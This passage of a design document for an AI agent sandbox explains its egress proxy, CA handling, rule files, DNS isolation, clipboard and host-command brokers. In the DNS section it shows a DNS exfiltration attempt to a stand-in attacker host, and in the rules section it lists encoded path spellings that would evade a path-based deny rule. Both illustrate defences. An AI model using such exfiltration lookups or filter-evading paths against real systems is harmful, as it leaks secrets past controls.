  GitLab documents GET downloads through its
  [raw-file API](https://docs.gitlab.com/api/repository_files/#get-raw-file-from-repository),
  with `lfs=true`, and its
  [archive API](https://docs.gitlab.com/api/repositories/#get-file-archive),
  with `include_lfs_blobs=true`. These downloads remain subject to the destination rules, including
  any redirected destination. TODO.md records the download-only inspection that would allow LFS
  batch downloads.

Each inspected connection carries one request, forwarded using validated body framing, and its
response, then closes. The proxy sends `Connection: close` to the origin and validates the
response's framing to detect truncation. This removes connection reuse as a request-smuggling path
without assuming that the origin parses every byte identically. Ambiguous framings — a
`Content-Length` beside a `Transfer-Encoding`, or conflicting `Content-Length` values — are refused
rather than resolved. ALPN is restricted to `http/1.1` so the proxy can parse the request.
`Upgrade` is refused, so no WebSocket or cleartext HTTP/2 can turn the one inspected request
into a stream the proxy no longer reads.

### Who holds the CA key

The launcher keeps the CA private key on the host under every profile except `allow-unless-denied`.
That profile uses a separate per-run CA, described below.

Each project gets its own CA, created under `~/.local/state/ko-agent-sandbox/tls/<project>`
(`%LOCALAPPDATA%` on Windows) — outside `/workspace`, so the agent can neither read the key that
signs what it is shown nor replace it for the next session. A CA created for one project cannot be
used to read another's traffic.

The launcher reissues the CA a month before expiry. It reissues the leaf with the CA, a month
before the leaf expires, or when the resolved inspected set changes.

What reaches the proxy container is one leaf certificate and that leaf's own key, bind-mounted
read-only. The leaf names exactly this project's resolved inspected set — the inspected hosts after
its profile and `egress/rule` apply — which the launcher does not keep a copy of: it reads the hosts
off the `allow` lines of the proxy image's own `--print-ruleset` under the same rules at launch, so
a custom proxy image, or a project adding an inspected host, gets a matching leaf and there is no
second list to drift. The proxy still refuses to start unless the certificate names exactly the
inspected set of the ruleset it resolved. A missing name would cause a TLS error for an admitted
inspected host. An extra name would let the proxy authenticate as a host outside its inspection set,
potentially including an opaque model endpoint.

Under `allow-unless-denied`, admitted unlisted hosts receive inspected `read` access. They cannot
all be named in a leaf issued at launch, so the proxy issues a leaf at each host's first connection,
which needs a CA key inside the proxy container — the process facing the internet, and under this
profile all of it. The CA is created for the run and trusted by that session alone through a bundle
kept in the run's directory under `tls/<project>/` and removed with it. The project CA never enters
the container. During the run, a compromised proxy could issue a certificate for an opaque tunnel
host and intercept model traffic or provider tokens. This is the additional authority required to
inspect unlisted hosts and restrict them to logged reads. The proxy is written in memory-safe code
and exposes no query endpoint (`doc/design.md`, "No HTTP query endpoint on the proxy"). Preparing
the run CA requires one keypair and one image-JDK trust store per launch. The run CA and its leaves
use the leaf validity period. Session isolation relies on which CA each session trusts, not on
expiration coinciding with an exit whose time was unknown at launch. The proxy requires a run CA
under this profile and refuses one under other profiles.

The sandbox trusts that CA — the project's, or under `allow-unless-denied` the run's — through a
bundle assembled on the host from the image's own CA bundle plus it, mounted over
`/etc/ssl/certs/ca-certificates.crt`. `SSL_CERT_FILE`,
`CURL_CA_BUNDLE`, `REQUESTS_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS` and `GIT_SSL_CAINFO` point at the same
file, for the programs with a trust store of their own rather than the system's.

The image's JDK is covered by the same technique one layer over, because it reads none of the
above: a JVM consults a `cacerts` keystore and a `net.properties` file. The image ships
`sandbox-jdk-use-proxy`, which imports the CA into one JDK's store with that JDK's own `keytool`
and appends the proxy to its `net.properties`; the launcher runs it on the image's own JDK in a
throwaway container with no network, copies the files out, and mounts them read-only over the
originals — with `JAVA_HOME` read from the image's own environment, so the launcher never
hardcodes the arch-dependent Temurin directory and an image without a JDK skips the mounts.
Every root the image shipped survives: dropping one would stay invisible until a TLS client reaches
an origin signed by that public CA, so the mounted store test checks the complete root set. The
store is prepared at launch rather than baked in, since the per-project CA postdates the image.

Programs not covered by the launcher's prepared trust stores need separate handling. A JVM the agent
installs itself (`cs java --jvm ...`) brings its own untouched store —
`sandbox-jdk-use-proxy` gives it both the CA and the proxy from inside, so the gap is one command
rather than a dead end; the certificate it reads is mounted beside the agent instructions, and is
the same public one already inside the bundle. A GraalVM native image — the
`cs` and `scala` launchers — has no `conf/` and reads no variable, so the proxy and CA
settings travel as `-D` options in `KO_AGENT_SANDBOX_JAVA_OPTS`, which the agent passes by hand.
A statically linked binary keeps its compiled-in roots — the Codex CLI, which talks only to
uninspected OpenAI.

### Why the rules are per project, in the project, and read-only

A single shared rule file would combine the access requirements of otherwise unrelated projects.
Per-project rules let a repository that only reads public documentation use different grants from
one that holds credentials. The rules can be reviewed in a pull request alongside the project.

Without separate protection, an agent with a writable `/workspace` could rewrite the rules for the
next session. The write-mode protections prevent this ("A project loosening its own confinement",
above). The launcher rejects a symlink or any other non-directory object at the boundary-directory
path. Only recognized configuration entries are accepted: an unrecognized entry — a misspelled
`egres/`, notes, or a backup — causes launch failure instead of being silently ignored. The same
rule applies within `egress/` (`doc/egress-proxy.md` lists the refusals; dot-named editor and OS
metadata are excepted, since no configuration will ever be named that way). What remains is "A
repository that ships wide egress rules", above.

### Adding hosts, not patterns

The rule file's lines name exact hostnames, as URLs; the one wildcard is `**.domain`, on the denial
side — `deny https://**.domain/`. This asymmetry is deliberate.

Exact-host grants make the allowed destinations explicit and enumerable for review. Wildcard
grants would also admit matching hosts added later. For a shared apex like a cloud provider's,
`allow https://*.example.com/` could admit names an attacker can register or take over. The breadth
is in the grant, not the matcher, so no careful pattern syntax removes it. For an inspected host
under the finite profiles, an open-ended subtree also cannot satisfy the design's certificate check:
the leaf issued at launch must enumerate the inspected host set. Grants therefore name exact hosts.
`allow-unless-denied` separately allows unlisted public hosts unless denied, with inspected `read`
access. The user selects that profile on the launch command line; a repository cannot select it by
adding a wildcard grant.

A line grants exactly its words, under the path it names, and nothing else on the host; nothing is
implied, so a line with no grant word is refused rather than read as `read`. The grammar, the order
the lines apply in and how a request finds its line are `doc/egress-proxy.md`, "The rule file"; what
follows is why. A `deny` names a host or a subtree, never a path, because a grant by path needs one
spelling that works while a denial by path needs every spelling that reaches the tenant, and the
proxy, comparing literally, cannot know them. With the defaults granting `git-fetch` on
`github.com`, a hypothetical `deny https://github.com/secret-org/` would be escaped by
`/%73ecret-org/…`, which misses the deny, matches the root line and is admitted, GitHub decoding
`%73` to `s`; by `/Secret-Org/…`, GitHub folding case; by `/secret-org./` and `/secret-org;v=1/` on
an origin that strips a segment's trailing dot or a `;parameter`; and by `/orgs/secret-org` or a
search page, reaching the organisation under paths the deny never named. Each escape gains access: a
denial by path fails open. The ordering the grammar gives instead — a host-wide `deny` with the
narrower `allow` beneath it — fails closed: every spelling that misses the narrower allow stays
governed by the host-wide deny, so an escape loses access. A case-folding keyword would close one of
these on one origin and none of the others, so it is not a way in.

A path on an `allow` line, written after a host-wide `deny`, restricts access relative to a
whole-host grant. It does not prove tenant isolation for every possible origin. The proxy checks a
request path's syntax and matches it literally, without reproducing the origin's handling of
percent-escapes, `..`, backslashes, empty segments or letter case. A rule's path must be in
canonical form or the launch fails; checks on request spellings depend on the matched scope
(`doc/egress-proxy.md`, "The rule file"). Under the root a request has the host's least grants and
gains nothing by decoding, so `GET` and `HEAD` are exempt from the path-spelling checks there. The
other supported methods still refuse percent-encoding and dot segments at the root. The cost is a
path the origin would have accepted and this rule refuses, and a path only spellable encoded — a
space, a non-ASCII name — that cannot be narrowed at all. A path in the wrong case fails closed on
GitHub, where `/MyOrg/` and `/myorg/` are one owner, and on GCS, where they are two buckets, alike.
The proxy does not follow redirects. A client following one sends a new request, which must
independently satisfy the rules for its destination and path; an earlier grant does not authorize
the redirected request. A path grant does not bound the message ("Exfiltration through allowed
network traffic", above). The catalog grants whole-host access to public Git hosting services by
default; a project that needs access to one owner can deny the host and then allow that owner's
path.

Two forms of widening are allowed but made explicit. A `method=POST` grant covering a repository's
discovery and `git-receive-pack` paths allows push; the launch's widening report and
`--egress-effective` show that grant. A `tunnel` grant for a host inspected by the defaults requires
`deny defaults` followed by the project's complete ruleset. This makes the loss of inspection and
request-level auditing an explicit decision about the whole ruleset. Restricting an existing tunnel
to inspected reads requires only a deny and an allow for that host.

A wildcard *removal* is the mirror image: it only ever shrinks what is admitted, so its worst case
is denying a wanted host — fail-closed — never reaching a new one. `**.foo.com` is the concise
way to drop a provider that ships several subdomains without re-listing its current ones; `deny
model-provider NAME` names every host in that provider's default rules as its endpoints change
(`doc/egress-proxy.md`, "The rule file"). Unlike a grant, a removal can fail when a typo matches
nothing, leaving a default in place while reading as though it were dropped. A `deny` matching
nothing at its position produces a warning under every profile. Under `allow-unless-denied`, it
may intentionally deny an otherwise unlisted host, so the validator cannot treat it as a typo.
The other two warnings (`doc/egress-proxy.md`, "The rule file") concern lines that grant nothing;
a warning rather than a refusal because the check reads the defaults, and a file that launches
today must not fail under a later image whose defaults include it.

Every other ambiguity — `doc/egress-proxy.md` lists them — is a failed launch, never ignored
config.

### Why the ruleset is not a capability system

The ruleset names destinations and grants protocol operations: reading, Git fetch, and specified
HTTP methods at paths. It has no `GitRead(owner/repo)`-style capabilities. This is deliberate:
agents need broad access to public information, and the launcher does not automatically forward host
credentials ("Credential theft", above).

A per-repository capability could restrict private-repository access granted by credentials such as
Copilot's `repo`-scope token ("The web reached through the model provider", above). Under the
default inspected rules, its excess repository authority allows reads, while writes are refused.
That limit does not cover explicit method grants or Copilot's opaque model endpoint. Restricting
those reads to one repository would reduce exposure, but an allowed read could still exfiltrate
project data in its URL ("Exfiltration through allowed network traffic", above).

A capability vocabulary would add another policy language whose semantics must remain consistent
across its consumers. The standing decision in `doc/design.md`, "No general capability broker",
requires a concrete credentialed-operation requirement before adding that mechanism.

### DNS

The sandbox runs with `--dns=none` and a single `--add-host` entry for the proxy. When configured to
use the proxy for HTTPS, curl, npm and uv send `CONNECT host:443`; the proxy resolves the
destination, so those requests require no DNS lookup inside the sandbox.

What a session is left with, measured from inside one:

    $ getent hosts egress-proxy          # from /etc/hosts, no resolver involved
    10.89.0.2       egress-proxy
    $ getent hosts $SECRET.attacker.example
    (no answer, 2 ms)

**Routing is what enforces this, not the resolver configuration.** `--dns=none` means podman writes
no `resolv.conf`, so the container keeps the image's own — which still names public resolvers. They
are unreachable: the sandbox's network is `--internal`, its routing table holds one on-link entry
and no default route, so a packet to a nameserver outside it has nowhere to go and the lookup fails
at once rather than travelling anywhere. The one name that must work needs no resolver at all,
because `--add-host` put it in `/etc/hosts`.

Unsetting the proxy variables does not create a route. `SessionBoundaryTest` checks failed direct
network access, failed external name resolution, and the absent default route underlying both.

## Clipboard

Clipboard access is off by default because the host clipboard may contain sensitive information.
`KO_AGENT_SANDBOX_CLIPBOARD` accepts `off`, `paste` or `bidirectional`; unset or empty selects
`off`, and any other value fails the launch. The enabled channel has these properties:

- **The sandbox asks; the host answers.** The sandbox opens no connection to the host. The broker —
  a job of the reaper on POSIX, a thread of the resident launcher on Windows — holds one `podman
  exec` reading a FIFO under the sandbox's `/tmp`, and answers requests through another. No host
  listener, no port, no proxy rule, no file in the project, and nothing moves until a clipboard call
  from inside (`ClipboardBroker`, the image's `ko-agent-clipboard` shim).
- **The grant is to the container, not to the agent.** Any process can invoke the shim: an agent
  subprocess, a build script, or a dependency's postinstall script. The selected mode therefore
  applies to everything the session executes. Use `off` when that code must not access the
  clipboard.
- **`paste` grants reads of the current image, as often as asked, for the whole session.** Each
  request gets a PNG when the clipboard holds one, with no prompt and no per-read consent: what
  the user controls is what is on the clipboard at each moment, and a process polling the FIFOs
  can capture images copied later in the session. Text is never served. A `set` request is read
  and dropped.
- **`bidirectional` adds writes.** A session can replace the clipboard with arbitrary text,
  including text the user may later paste into a terminal. The user must explicitly select this
  mode.
- **The channel lasts for the session.** The FIFOs are on the container's tmpfs, and the broker ends
  with the sandbox. If the broker dies, the shim fails within its timeout rather than blocking the
  TUI indefinitely. Clipboard contents written by the session can remain after exit.

## Run on host

`--run-on-host=<programs>` (`sbt`, `mill`, `mvn`) is off by default and available only on macOS. It
allows agent-chosen code to execute on the host under a Seatbelt profile. The profile provides the
confinement for these commands; they execute outside the container. `doc/run-on-host.md` describes
the mechanism. Its security properties and costs are:

- **macOS only, structurally, not by neglect.** On Linux there is no VM between the sandbox and
  the hardware: a container command already runs at host speed on host memory, so host commands
  would buy nothing — and neither bubblewrap nor Landlock can express the access restrictions below:
  their name-pattern denies are evaluated at access time (a `.git` created *mid-build* is covered),
  while their mounts and rulesets are fixed at start. Windows AppContainers express the grants
  but not the denies: ACL inheritance has no name patterns, so a mid-build `.git` inherits the
  project's allow — a race where the deny must hold at every access. Seatbelt's access-time
  path filters give the guard exactly that, and the feature exists only where it holds.

- **The sandbox asks; the host answers.** A host-side broker uses a FIFO channel like the clipboard
  broker's. It starts each command as its child, streams output back, and returns the exit code.
  There is no host listener or port; the host broker initiates execution (`RunOnHostChannel`, the
  image's `sandbox-run-on-host` shim).
- **The profile is the boundary; the request is not.** A request names a program, a working
  directory and arguments. The program must be one the launch named. The requested working directory
  is resolved and proven inside the project before anything derives from it, and never changes the
  profile's project grant. The arguments are deliberately not vetted: they select code the agent
  already chooses (`sbt 'set …'` reaches arbitrary Scala without touching `build.sbt`), and the
  profile confines whatever they select. A command's access consists of: the project read-write
  except `.git` and `.ko-agent-sandbox` — denied at any depth after path resolution, link creation
  included, with the `.GIT` gap `doc/run-on-host.md` records — its own per-project run-on-host
  caches, one Coursier-managed JDK read-only, the program's own executable and distribution
  read-only — the cs-installed `sbt` and the distribution it execs in the Coursier archive cache,
  the one mill executable the user provisioned, the one Maven the project's wrapper unpacked under
  `$MAVEN_USER_HOME/wrapper/dists`, or `~/.m2/wrapper/dists` when `MAVEN_USER_HOME` is unset — a
  temporary directory for that command, and loopback to its own egress proxy. The proxy admits
  repositories named in `.ko-agent-sandbox/host-command/<program>/egress/rule` (`allow
  https://<host>/ read` lines only; unrecognized configuration entries are refused, as in the parent
  directory) plus Maven Central.
  Everything else user-owned is invisible — the launcher state root and the rest of the user's
  caches included.
- **The command's environment is a closed set, not the launcher's.** The wrapper constructs it from
  its own settings, three pass-through variables, and the variables named by `--env` at launch
  (`doc/run-on-host.md`, "The command's lifetime and environment", lists them). The same forwarded
  variables reach the sandbox, and `KO_AGENT_SANDBOX_*` is refused on both paths. Inheriting the
  full host environment would expose unrelated secrets, including an upstream proxy credential in
  the launcher's `HTTPS_PROXY`, to agent-chosen code. The wrapper's settings take precedence, so a
  forwarded `HTTPS_PROXY` cannot redirect the command past its proxy, and a forwarded
  `JAVA_TOOL_OPTIONS` cannot add to its JVM options; `MILL_VERSION` is dropped even when forwarded,
  so the command uses the executable the profile authorizes. Below the launcher, whose arguments are
  what the user typed, forwarded names travel to the broker and each command as arguments. Values
  travel through their environments under carrier names (`RunOnHostSandbox.carrierName`), so no
  unconfined helper reads an explicit value before the command's environment is built. The broker
  inherits the launcher's environment as the launcher's own JVM ran in it, so a name-only forward
  names a variable already there.
- **One sbt server per project, owned by the current command.** A thin sbt client attaches to
  whatever server the project's portfile names and then runs with *that server's* environment — its
  cache, its confinement or lack of it — so the wrapper refuses to start while a foreign live server
  holds the portfile, starts the command's server inside the profile, and ends it, portfile
  included, before the wrapper exits. The cost is that no warm daemon spans commands: sbt's server
  lives for one `sandbox-run-on-host` command, `mill` runs `--no-daemon`, and Maven runs once and
  exits. Under `--auto-shutdown-foreign-sbt-on-host` the wrapper ends the foreign server first
  instead of refusing. The user authorized this shutdown at launch; the wrapper records it in the
  command's transcript. The shutdown is sent only to the socket the wrapper derives from the project
  path using sbt's derivation, never to one the portfile names. The portfile is workspace content,
  so trusting its spelling would let the project redirect an unconfined client exchange to any
  socket this uid can reach. The derived path identifies the server the user authorized the wrapper
  to stop. It is refused if a command could have planted it: resolution proceeds one link at a time,
  and no step may resolve into the project or the per-project caches that outlive a session. An
  environment placing sbt's server directory inside either — and a chain that passes through one on
  its way somewhere innocent — leaves the refusal in place instead.
- **The payload that matters runs later, as you.** If a command could write an executable
  `.git/hooks/post-checkout`, that hook would run on your next `git checkout`, outside every
  sandbox. Preventing that write has two enforcement points — the workspace filter
  for writes through `/workspace`, this profile's deny rules for writes by the command — both named
  under "The host's git executing what the sandbox wrote", above.
- **Cache poisoning stops at the project.** The command writes its own per-project caches, never
  yours: the Coursier cache, sbt's global base — its boot directory and content-addressed
  store — sbt's Ivy home, which `publishLocal` writes, and Maven's local repository, which holds
  every plugin a Maven build runs. A poisoned artifact in any of them reaches later agent commands
  of the same project, which are themselves sandboxed, and no other project and no unsandboxed
  command — and `--reset` discards them all with the project's other state; `--reset-run-on-host`
  discards those caches alone. The separation is by root, one directory holding them
  (`doc/run-on-host.md`, "The run-on-host cache"), because Seatbelt has no mount namespace to
  overlay with (`plan-coursier.md` reaches the same property for the container by a podman `:O`
  upper).
- **The command's output can disclose host paths.** Compiler messages can include the project's
  absolute path on the host.
- **`--write=reject` composes, and the project is then no longer read-only to the session.** A host
  command can write `target/` and any other path allowed by the profile's project grant. Selecting
  both options authorizes those writes despite the container's read-only mount. A session that must
  leave the project untouched must not enable `--run-on-host`.
- **Teardown follows descriptor lifetime.** The shim holds one FIFO open for the life of its
  request, and the request itself travels on it, so no command starts without its liveness; an
  interrupted command, a killed shim and a dead sandbox container all close it, and the broker ends
  the command with SIGTERM — the wrapper's own hook teardown, which ends the command's process
  groups, its sbt server and its proxy, appends the command's proxy audit log and sbt's
  server-stderr file to the channel's log on the host (`doc/run-on-host.md`, "The channel and the
  command"), and removes the command's directory. If SIGKILL prevents that teardown, the recorded
  groups remain, and the next start's scavenger ends them by proof, never by guess.

## No containers inside the sandbox by default

The default excludes both forms of additional container execution:

- **Nested** — the supported runtime requires relaxed process masks, SELinux confinement and
  capability settings, as detailed below. In particular, a nested container cannot mount its own
  `/proc` while the locked overmounts remain in place. Those relaxations also apply to untrusted
  repository code running in the outer container.
- **Sibling** — a service container beside the sandbox would be a new host-level object with its own
  attack surface, reachable laterally from the sandbox and running outside its confinement.

Test services can instead run as ordinary processes inside the sandbox, with the same uid,
capabilities and egress confinement: PostgreSQL through `initdb`/`pg_ctl`, for example, or an S3
endpoint through a JVM mock such as Adobe S3Mock.

**The opt-in, and its price.** `KO_AGENT_SANDBOX_NESTING` accepts `none` or `same-uid`; unset or
empty selects `none`, and any other value fails the launch. Selecting `same-uid` relaxes these
controls for every process in the session, including untrusted repository code. `NestingLoosenings`
records why each change is required:

- `--security-opt=unmask=ALL` re-exposes the informational files — `/proc/keys`,
  `/proc/timer_list`, `/proc/sched_debug` — while `/proc/kcore` stays unreadable, owned by a real
  root this rootless container never maps. That class of leak matters in the kernel-exploit
  scenario this design already places out of scope ("Container, runtime and kernel escape", above).
- `--security-opt=label=disable` removes the machine's SELinux layer from around this one sandbox
  for the session; the boundary then rests on what the design counts on everywhere else —
  namespaces, dropped capabilities, seccomp, the read-only rootfs and the egress proxy.
- `--cap-add=SYS_CHROOT` reaches every process in the session, not just the nested runtime, because
  podman grants a capability to a non-root user ambiently. Acceptable because chroot is not a
  boundary this design relies on anywhere: nothing in the sandbox is chroot-confined, and under
  no-new-privileges there is no setuid binary for a hostile chroot to confuse.

`/dev/fuse` is not among them: nested storage runs on kernel-native overlay inside the user
namespace — measured, the container rootfs mounts as `overlay` and the test matrix passes with
the fuse-overlayfs binary removed — so the kernel's FUSE code stays out of reach.

The remaining controls bound nested execution. `no-new-privileges` prevents `newuidmap` from gaining
its setuid privilege, limiting a nested user namespace to one mapped uid: an image that switches
`USER` or chowns to a second uid fails by design — this repository's own images among them, so the
sandbox still cannot build itself. The egress topology is inherited, not escaped: inner containers
share the sandbox's network namespace, their only route out is still the proxy, and an image pull is
an ordinary logged CONNECT to a registry the ruleset admits — Docker Hub, `ghcr.io`, `quay.io`,
`gcr.io` and ECR Public are built in, any other registry is the project's `egress/rule` to add. No
runtime is preinstalled. The image's `sandbox-install-podman` refuses to run outside this mode;
within it, the script unpacks Podman under `$HOME` without acquiring additional privileges. Its
storage is discarded with the session. The next launch without the opt-in uses the default process
masks and security options.
